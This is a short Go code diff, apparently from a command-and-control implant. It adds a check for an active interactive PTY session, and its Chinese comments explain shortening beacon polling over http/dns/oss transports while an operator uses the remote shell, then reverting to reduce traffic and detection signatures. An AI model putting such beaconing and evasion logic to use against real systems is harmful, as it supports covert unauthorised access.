@@ -63,6 +63,21 @@ var (
 	ptyMutex       sync.Mutex
 )
 
+// InteractiveShellActive 报告本机是否有一个活跃的交互式终端会话。
+//
+// 轮询传输（http/https/dns/oss）一轮 GET 只取一条命令，空闲轮询间隙就是操作员
+// 能感觉到的输入延迟。runloop 据此在"确实有人在用终端"时缩短轮询，会话结束立刻
+// 回落到正常信标节奏，不为闲置终端付流量与特征代价。
+func InteractiveShellActive() bool {
+	ptyMutex.Lock()
+	pty := globalXTermPTY
+	ptyMutex.Unlock()
+	if pty == nil {
+		return false
+	}
+	return pty.active()
+}
+
 // StartInteractiveShell 启动基于github.com/creack/pty的真正PTY交互式终端
 func StartInteractiveShell() ([]byte, error) {
 	ptyMutex.Lock()
